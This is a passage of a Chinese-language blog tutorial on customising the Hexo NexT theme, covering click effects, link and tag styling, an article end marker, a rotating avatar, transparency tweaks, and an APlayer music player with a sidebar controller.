class="comment">;</span></span><br><span class="line">    document.body.appendChild(<span class="name">d</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  function css(<span class="name">css</span>)&#123;</span><br><span class="line">    var style = document.createElement(<span class="string">"style"</span>)<span class="comment">;</span></span><br><span class="line">    style.type=<span class="string">"text/css"</span><span class="comment">;</span></span><br><span class="line">    try&#123;</span><br><span class="line">      style.appendChild(<span class="name">document.createTextNode</span>(<span class="name">css</span>))<span class="comment">;</span></span><br><span class="line">    &#125;catch(<span class="name">ex</span>)&#123;</span><br><span class="line">      style.styleSheet.cssText = css;</span><br><span class="line">    &#125;</span><br><span class="line">    document.getElementsByTagName(<span class="name">'head'</span>)[<span class="number">0</span>].appendChild(<span class="name">style</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  function randomColor()&#123;</span><br><span class="line">    return <span class="string">"rgb("</span>+(~~(<span class="name">Math.random</span>()*255))+<span class="string">","</span>+(~~(<span class="name">Math.random</span>()*255))+<span class="string">","</span>+(~~(<span class="name">Math.random</span>()*255))+<span class="string">")"</span><span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(<span class="name">window</span>,document)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>将上面源码存放为click.js文件内，将click.js文件放在/hexo/themes/next/source/js/src\路径下。<br>打开 /hexo/themes/next/layout/_layout.swig 文件， 在head标签内最后位置添加以下代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/src/click.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h2><p>修改文件/themes/next/source/css/_common/components/post/post.styl，在末尾添加如下css样式：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文章底部标签样式"><a href="#文章底部标签样式" class="headerlink" title="文章底部标签样式"></a>文章底部标签样式</h2><p>修改模板/hexo/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成<i class="fa fa-tag"></i>或者可以从<a href="http://fontawesome.io/icons/" target="_blank" rel="noopener" title="fontawesome.io">这里</a>自己挑。</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for(tag.path) &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">rel</span>=<span class="string">"tag"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-tag"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><span class="template-variable">&#123;&#123; tag.name &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="文章末尾添加结束标记"><a href="#文章末尾添加结束标记" class="headerlink" title="文章末尾添加结束标记"></a>文章末尾添加结束标记</h2><p>在路径/hexo/themes/next/layout/_macro/中新建 passage-end-tag.swig 文件,并添加以下内容：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>-------------本文结束<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-heart-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>感谢您的阅读-------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>接着打开/hexo/themes/next/layout/_macro/post.swig文件，post-footer之前添加如下代码（post-footer之前两个DIV）：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'passage-end-tag.swig' %&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> (theme.alipay or theme.wechatpay or theme.bitcoin) and not is_index %&#125;</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'reward.swig' %&#125;</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> theme.post_copyright.enable and not is_index %&#125;</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'post-copyright.swig' with &#123; post: post &#125; %&#125;</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"post-footer"</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>打开主题配置文件/hexo/themes/next/_config.yml,在末尾添加：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加结束标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="侧边栏作者头像修改"><a href="#侧边栏作者头像修改" class="headerlink" title="侧边栏作者头像修改"></a>侧边栏作者头像修改</h2><p>把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果，修改/hexo/themes/next/source/css/_common/components/sidebar/sidebar-author.styl:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.site-author-image</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">padding</span>: $site-author-image-padding;</span><br><span class="line">  <span class="attribute">max-width</span>: $site-author-image-width;</span><br><span class="line">  <span class="attribute">height</span>: $site-author-image-height;</span><br><span class="line">  <span class="attribute">border</span>: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 头像圆形 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">-webkit-border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">-moz-border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: inset <span class="number">0</span> -<span class="number">1px</span> <span class="number">0</span> <span class="number">#333</span>sf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 </span></span><br><span class="line"><span class="comment">    (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/</span></span><br><span class="line">  <span class="attribute">-webkit-animation</span>: play <span class="number">2s</span> ease-out <span class="number">1s</span> <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">-moz-animation</span>: play <span class="number">2s</span> ease-out <span class="number">1s</span> <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">animation</span>: play <span class="number">2s</span> ease-out <span class="number">1s</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 鼠标经过头像旋转360度 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition</span>: -webkit-transform <span class="number">1.5s</span> ease-out;</span><br><span class="line">  <span class="attribute">-moz-transition</span>: -moz-transform <span class="number">1.5s</span> ease-out;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">1.5s</span> ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* 鼠标经过停止头像旋转 </span></span><br><span class="line"><span class="comment">  -webkit-animation-play-state:paused;</span></span><br><span class="line"><span class="comment">  animation-play-state:paused;*/</span></span><br><span class="line">  <span class="comment">/* 鼠标经过头像旋转360度 */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(<span class="number">360deg</span>);</span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(<span class="number">360deg</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">360deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Z 轴旋转动画 */</span></span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(-<span class="number">360deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(-<span class="number">360deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(-<span class="number">360deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-author-name</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: $site-author-name-margin;</span><br><span class="line">  <span class="attribute">text-align</span>: $site-author-name-align;</span><br><span class="line">  <span class="attribute">color</span>: $site-author-name-color;</span><br><span class="line">  <span class="attribute">font-weight</span>: $site-author-name-weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-description</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: $site-description-margin-top;</span><br><span class="line">  <span class="attribute">text-align</span>: $site-description-align;</span><br><span class="line">  <span class="attribute">font-size</span>: $site-description-font-size;</span><br><span class="line">  <span class="attribute">color</span>: $site-description-color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="背景-amp-透明度美化"><a href="#背景-amp-透明度美化" class="headerlink" title="背景&amp;透明度美化"></a>背景&amp;透明度美化</h2><h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;   </span><br><span class="line">        <span class="attribute">background</span>:<span class="built_in">url</span>(图片链接);</span><br><span class="line">        <span class="attribute">background-size</span>:cover;</span><br><span class="line">        <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">        <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">        <span class="attribute">background-position</span>:center;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="文字背景色设置"><a href="#文字背景色设置" class="headerlink" title="文字背景色设置"></a>文字背景色设置</h3><p>在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">            <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">            <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">            <span class="attribute">background</span>:<span class="built_in">rgba</span>(颜色rgb,透明度) none repeat scroll <span class="meta">!important</span>;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><h3 id="代码块美化"><a href="#代码块美化" class="headerlink" title="代码块美化"></a>代码块美化</h3><p>这块工作让我头痛了很久！！！<br>代码块透明度设置，在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单行代码块设置</span></span><br><span class="line">code &#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.3</span>);</span><br><span class="line">  margin: <span class="number">2</span>px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 多行代码块的自定义样式</span></span><br><span class="line">.highlight&#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line">.highlight, pre &#123;</span><br><span class="line">  margin: <span class="number">5</span>px <span class="number">0</span>;</span><br><span class="line">  padding: <span class="number">5</span>px;</span><br><span class="line">  border-radius: <span class="number">3</span>px;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line">.highlight, td&#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.1</span>)</span><br><span class="line">&#125;</span><br><span class="line">.highlight, gutter pre&#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.1</span>)</span><br><span class="line">&#125;</span><br><span class="line">.highlight, code, pre &#123;</span><br><span class="line">    border: <span class="number">1</span>px solid #d6d6d6;</span><br><span class="line">    background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.3</span>)</span><br><span class="line">&#125;</span><br><span class="line">table&gt;tbody&gt;tr:nth-of-type(odd)&#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释/hexo/themes/next/source/css/_components/highlight/highlight.styl文件第81、88行：</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">// <span class="built_in">background</span>-<span class="built_in">color</span>: $highlight-gutter.bg-<span class="built_in">color</span></span><br></pre></td></tr></table></figure><p>这一块修改学习到了一个小技巧，通过chrome的F12→Elements→Styles进行一层层修改测试，快速找到需要修改的地方。Ps：这里要谢谢我的同事-C！<br><img src="https://i.loli.net/2018/01/15/5a5ca240a86fa.jpg" alt="chrome F12.jpg"></p><h2 id="播放器"><a href="#播放器" class="headerlink" title="播放器"></a>播放器</h2><h3 id="安装APlayer插件"><a href="#安装APlayer插件" class="headerlink" title="安装APlayer插件"></a>安装APlayer插件</h3><p>安装Aplayer播放器，在/hexo目录执行<code>npm install aplayer --save</code>。<br>安装完后在node_modules目录下找到APlayer.min.js文件，将其复制到theme/next/source/js/src/目录下。<br>在你想要加入音乐播放器的地方插入以下代码，这里我把它放到了侧边栏。<br>打开theme/next/layout/_custom/文件夹下的sidebar.swig文件，向其中添加以下代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"player1"</span> <span class="attr">class</span>=<span class="string">"aplayer"</span> <span class="attr">data-id</span>=<span class="string">"2058781355"</span> <span class="attr">data-server</span>=<span class="string">"netease"</span> <span class="attr">data-type</span>=<span class="string">"playlist"</span> <span class="attr">data-mode</span>=<span class="string">"circulation"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/js/src/APlayer.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> ap = <span class="keyword">new</span> APlayer(&#123;</span></span><br><span class="line"><span class="javascript">    element: <span class="built_in">document</span>.getElementById(<span class="string">'player1'</span>),                       <span class="comment">// Optional, player element</span></span></span><br><span class="line"><span class="actionscript">    narrow: <span class="literal">false</span>,                                                     <span class="comment">// Optional, narrow style</span></span></span><br><span class="line"><span class="actionscript">    autoplay: <span class="literal">true</span>,                                                    <span class="comment">// Optional, autoplay song(s), not supported by mobile browsers</span></span></span><br><span class="line"><span class="actionscript">    showlrc: <span class="number">3</span>,                                                        <span class="comment">// Optional, show lrc, can be 0, 1, 2, see: ###With lrc</span></span></span><br><span class="line"><span class="actionscript">    mutex: <span class="literal">true</span>,                                                       <span class="comment">// Optional, pause other players when this player playing</span></span></span><br><span class="line"><span class="actionscript">    theme: <span class="string">'#e6d0b2'</span>,                                                  <span class="comment">// Optional, theme color, default: #b7daff</span></span></span><br><span class="line"><span class="actionscript">    mode: <span class="string">'circulation'</span>,                                               <span class="comment">// Optional, play mode, can be `random` `single` `circulation`(loop) `order`(no loop), default: `circulation`</span></span></span><br><span class="line"><span class="actionscript">    preload: <span class="string">'metadata'</span>,                                               <span class="comment">// Optional, the way to load music, can be 'none' 'metadata' 'auto', default: 'auto'</span></span></span><br><span class="line"><span class="actionscript">    listmaxheight: <span class="string">'513px'</span>,                                            <span class="comment">// Optional, max height of play list</span></span></span><br><span class="line">    music: [</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            title: <span class="string">'化身孤岛的鲸'</span>,                                          <span class="comment">// Required, music title</span></span></span><br><span class="line"><span class="actionscript">            author: <span class="string">'不才'</span>,                                                <span class="comment">// Required, music author</span></span></span><br><span class="line"><span class="actionscript">            url: <span class="string">'/music/不才 - 化身孤岛的鲸.mp3'</span>,                          <span class="comment">// Required, music url</span></span></span><br><span class="line"><span class="actionscript">            pic: <span class="string">'/music/不才 - 化身孤岛的鲸.jpg'</span>,                          <span class="comment">// Optional, music picture</span></span></span><br><span class="line"><span class="actionscript">            lrc: <span class="string">'/music/不才 - 化身孤岛的鲸.lrc'</span>                           <span class="comment">// Optional, lrc, see: ###With lrc</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            title: <span class="string">'我的一个道姑朋友'</span>,                                      <span class="comment">// Required, music title</span></span></span><br><span class="line"><span class="actionscript">            author: <span class="string">'以冬'</span>,                                               <span class="comment">// Required, music author</span></span></span><br><span class="line"><span class="actionscript">            url: <span class="string">'/music/以冬 - 我的一个道姑朋友.mp3'</span>,                     <span class="comment">// Required, music url</span></span></span><br><span class="line"><span class="actionscript">            pic: <span class="string">'/music/以冬 - 我的一个道姑朋友.jpg'</span>,                    <span class="comment">// Optional, music picture</span></span></span><br><span class="line"><span class="actionscript">            lrc: <span class="string">'/music/以冬 - 我的一个道姑朋友.lrc'</span>                    <span class="comment">// Optional, lrc, see: ###With lrc</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            title: <span class="string">'七月上'</span>,                                          <span class="comment">// Required, music title</span></span></span><br><span class="line"><span class="actionscript">            author: <span class="string">'Jam'</span>,                                           <span class="comment">// Required, music author</span></span></span><br><span class="line"><span class="actionscript">            url: <span class="string">'/music/Jam - 七月上.mp3'</span>,                          <span class="comment">// Required, music url</span></span></span><br><span class="line"><span class="actionscript">            pic: <span class="string">'/music/Jam - 七月上.jpg'</span>,                         <span class="comment">// Optional, music picture</span></span></span><br><span class="line"><span class="actionscript">            lrc: <span class="string">'/music/Jam - 七月上.lrc'</span>                         <span class="comment">// Optional, lrc, see: ###With lrc</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="自定义播放器样式"><a href="#自定义播放器样式" class="headerlink" title="自定义播放器样式"></a>自定义播放器样式</h3><p>包含颜色更改，列表歌曲信息的排版修改。<br>在/hexo/theme/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 播放器设置</span></span><br><span class="line"><span class="selector-class">.aplayer-list</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;   <span class="comment">/*列表悬停颜色*/</span></span><br><span class="line">                  <span class="attribute">background</span>:rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.3</span>) none repeat scroll <span class="meta">!important</span>;&#125;</span><br><span class="line"><span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span> &#123;   <span class="comment">/*列表底色*/</span></span><br><span class="line">                        <span class="attribute">background</span>:rgba(<span class="number">250</span>,<span class="number">252</span>,<span class="number">123</span>,<span class="number">0.3</span>);&#125;</span><br><span class="line"><span class="selector-class">.aplayer-list-light</span> &#123;   <span class="comment">/*列表播放歌曲颜色*/</span></span><br><span class="line">                      <span class="attribute">background</span>:rgba(<span class="number">97</span>,<span class="number">217</span>,<span class="number">101</span>,<span class="number">0.3</span>) none repeat scroll <span class="meta">!important</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#player1</span> &#123;    <span class="comment">/*边框样式*/</span></span><br><span class="line">          <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">          <span class="selector-tag">div</span>,<span class="selector-tag">ol</span> &#123;<span class="attribute">border-radius</span>: <span class="number">6px</span>;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="selector-id">#player1</span> *&#123;<span class="attribute">color</span>: <span class="number">#696969</span>;&#125;    <span class="comment">/*字体颜色*/</span></span><br><span class="line"><span class="comment">/*列表歌曲信息的排版*/</span></span><br><span class="line"><span class="selector-class">.aplayer-list-index</span>&#123;<span class="attribute">float</span><span class="selector-pseudo">:left</span>;&#125;</span><br><span class="line"><span class="selector-class">.aplayer-list-title</span>&#123;<span class="attribute">float</span><span class="selector-pseudo">:left</span>;&#125;</span><br><span class="line"><span class="selector-class">.aplayer-list-author</span>&#123;<span class="attribute">float</span><span class="selector-pseudo">:right</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="音乐播放控制边栏"><a href="#音乐播放控制边栏" class="headerlink" title="音乐播放控制边栏"></a>音乐播放控制边栏</h3><p>将<a href="https://github.com/Mashiro-Sorata/APlayer-Controler/blob/master/demo/src/Aplayer-Controler.js" target="_blank" rel="noopener" title="Aplayer-Controler">APlayer-Controler</a>放入/hexo/themes/next/source/js/src/目录下。<br>在/hexo/themes/next/layout/_custom/文件夹下新建一个myapcontroler.swig的文件。向其中添加以下代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/js/src/APlayer-Controler.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"AP-controler"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> myapc=<span class="keyword">new</span> APlayer_Controler(&#123;</span></span><br><span class="line"><span class="javascript">		APC_dom:$(<span class="string">'#AP-controler'</span>),</span></span><br><span class="line"><span class="actionscript">		aplayer:ap, <span class="comment">//此为绑定的aplayer对象</span></span></span><br><span class="line"><span class="actionscript">		attach_right:<span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">		position:&#123;top:<span class="string">'300px'</span>,bottom:<span class="string">''</span>&#125;,</span></span><br><span class="line"><span class="actionscript">		fixed:<span class="literal">true</span>,</span></span><br><span class="line">		btn_width:100,</span><br><span class="line">		btn_height:120,</span><br><span class="line"><span class="actionscript">		img_src:[<span class="string">'http://oty1v077k.bkt.clouddn.com/bukagirl.jpg'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'http://oty1v077k.bkt.clouddn.com/jumpgirl.jpg'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'http://oty1v077k.bkt.clouddn.com/pentigirl.jpg'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'http://oty1v077k.bkt.clouddn.com/%E8%90%8C1.gif'</span>],</span></span><br><span class="line"><span class="actionscript">		img_style:&#123;repeat:<span class="string">'no-repeat'</span>,position:<span class="string">'center'</span>,size:<span class="string">'contain'</span>&#125;,</span></span><br><span class="line"><span class="actionscript">		ctrls_color:<span class="string">'rgba(173,255,47,0.8)'</span>,</span></span><br><span class="line"><span class="actionscript">		ctrls_hover_color:<span class="string">'rgba(255,140,0,0.7)'</span>,</span></span><br><span class="line"><span class="actionscript">		tips_on:<span class="literal">true</span>,</span></span><br><span class="line">		tips_width:140,</span><br><span class="line">		tips_height:25,</span><br><span class="line"><span class="actionscript">		tips_color:<span class="string">'rgba(255,255,255,0.6)'</span>,</span></span><br><span class="line">		tips_content:&#123;&#125;,</span><br><span class="line">		timeout:30</span><br><span class="line">	&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在/hexo/themes/next/layout文件夹下打开_layout.swig文件，在前添加以下代码：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> '_custom/myapcontroler.swig' %&#125;</span></span><br></pre></td></tr></table></figure><h2 id="侧边栏美化"><a href="#侧边栏美化" class="headerlink" title="侧边栏美化"></a>侧边栏美化</h2><p>在/hexo/themes/next/layout/_macro文件夹下打开sidebar.swig文件，找到以下代码行的位置：</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">&lt;nav <span class="keyword">class</span>=<span class="string">"site-state motion-element"</span>&gt;</span><br></pre></td></tr></table></figure><p>在上面添加以下代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--my custom code begin--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">"#sidebar"</span>).hover(<span 